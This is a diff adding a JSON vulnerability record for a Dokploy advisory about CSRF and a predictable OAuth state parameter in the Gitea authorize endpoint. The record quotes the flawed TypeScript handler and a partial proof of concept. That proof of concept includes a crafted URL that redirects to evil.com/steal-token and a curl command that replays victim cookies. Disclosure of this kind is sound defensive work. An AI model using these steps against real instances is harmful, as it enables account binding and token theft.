@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-vg9f-347r-pmqf",
+  "aliases": [],
+  "title": "CSRF on OAuth Authorization Endpoint",
+  "summary": "## 1. Description\r\n\r\n### Summary (One-liner)\r\nGitea OAuth authorization endpoint lacks CSRF token validation and Origin checking, allowing an attacker to bind arbitrary Gitea accounts to victim's Dokploy instance.\r\n\r\n### Root Cause\r\n- File: `apps/dokploy/pages/api/providers/gitea/authorize.ts:4-36`\r\n- Function: `handler` (Next.js API route)\r\n\r\nThe `/api/providers/gitea/authorize` endpoint accepts a `giteaId` query parameter and immediately redirects the user to the Gitea OAuth authorization URL. There is no CSRF token generation or validation, no Origin/Referer header checking, and the `state` parameter is set to the Gitea provider ID rather than a random nonce. This allows an attacker to craft a malicious link that initiates OAuth flow for an attacker-controlled Gitea instance.\r\n\r\n### Vulnerable Code\r\n\r\n```typescript\r\n// apps/dokploy/pages/api/providers/gitea/authorize.ts:4-36\r\nexport default async function handler(\r\n    req: NextApiRequest,\r\n    res: NextApiResponse,\r\n) {\r\n    try {\r\n        if (req.method !== \"GET\") {\r\n            return res.status(405).json({ error: \"Method not allowed\" });\r\n        }\r\n\r\n        const { giteaId } = req.query;\r\n\r\n        if (!giteaId || Array.isArray(giteaId)) {\r\n            return res.status(400).json({ error: \"Invalid Gitea provider ID\" });\r\n        }\r\n\r\n        const gitea = await findGitea(giteaId as string);\r\n        if (!gitea || !gitea.clientId || !gitea.redirectUri) {\r\n            return redirectWithError(res, \"Incomplete OAuth configuration\");\r\n        }\r\n\r\n        // Generate the Gitea authorization URL\r\n        const authorizationUrl = new URL(`${gitea.giteaUrl}/login/oauth/authorize`);\r\n        authorizationUrl.searchParams.append(\"client_id\", gitea.clientId as string);\r\n        authorizationUrl.searchParams.append(\"response_type\", \"code\");\r\n        authorizationUrl.searchParams.append(\r\n            \"redirect_uri\",\r\n            gitea.redirectUri as string,\r\n        );\r\n        authorizationUrl.searchParams.append(\"scope\", \"read:user repo\");\r\n        authorizationUrl.searchParams.append(\"state\", giteaId as string);  // <-- Predictable state\r\n\r\n        // Redirect user to Gitea authorization URL\r\n        return res.redirect(307, authorizationUrl.toString());\r\n    } catch (error) {\r\n        // ...\r\n    }\r\n}\r\n```\r\n\r\n**Critical:** The `state` parameter on line 33 is set to `giteaId` (a predictable database ID) instead of a cryptographically random nonce. There is no CSRF token in the session, no Origin header validation, and no verification that the OAuth initiation was user-initiated.\r\n\r\n### Attack Vector\r\n- Preconditions: Victim must have a Dokploy session (be logged in)\r\n- Entry point: `GET /api/providers/gitea/authorize?giteaId=VICTIM_ID&callbackUrl=http://evil.com`\r\n- Target: Victim's Dokploy OAuth configuration\r\n\r\n## 2. Proof of Concept\r\n\r\n### Prerequisites\r\n- OS: Any (browser-based attack)\r\n- Runtime: Dokploy running with Gitea provider configured\r\n- Network: Victim must visit attacker-controlled URL while logged into Dokploy\r\n\r\n### Reproduction Steps\r\n\r\n#### Step 1: Craft malicious URL\r\n```bash\r\n# The giteaId is the victim's configured Gitea provider ID\r\n# callbackUrl is controlled by attacker\r\nMALICIOUS_URL=\"http://localhost:3000/api/providers/gitea/authorize?giteaId=1&callbackUrl=http://evil.com/steal-token\"\r\n```\r\n\r\n#### Step 2: Send to victim\r\n```bash\r\n# Victim clicks the link while logged into Dokploy\r\ncurl -v -b /tmp/cookies.txt \"$MALICIOUS_URL\"\r\n```\r\n\r\n#### Step 3: Verify redirect\r\n```bash\r\n# Response shows redirect to Gitea with attacker's callbackUrl\r\n< HTTP/1.1 307 Temporary Redirect\r\n< Location: http://gitea.example.com/login/oauth/authorize?client_id=...&redirect_uri=http://evil.com/steal-token&state=1\r\n```\r\n\r\n### PoC Source Code\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\nPoC: CWE-352 CSRF on OAuth Authorization Endpoint\r\nTarget: Dokploy (Gitea OAuth flow)\r\nUsage: python3 poc.py [target_host:port]\r\n\"\"\"\r\nimport sys, requests\r\n\r\nHOST = sys.argv[1] if len(sys.argv)...",
+  "published_at": "2026-11-12T08:17:21.000Z",
+  "modified_at": "2026-11-12T08:17:21.000Z",
+  "severity": {
+    "level": "medium",
+    "score": 5.4,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-352"
+  ],
+  "affected": [
+    {
+      "product": "dokploy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "0.31.1"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-vg9f-347r-pmqf",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-vg9f-347r-pmqf",
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-vg9f-347r-pmqf",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:f78c386dfd477140cf5ebfe9764e1a1d5185dc8ee59ddb37645a070f4cf208af",
+  "note": null
+}
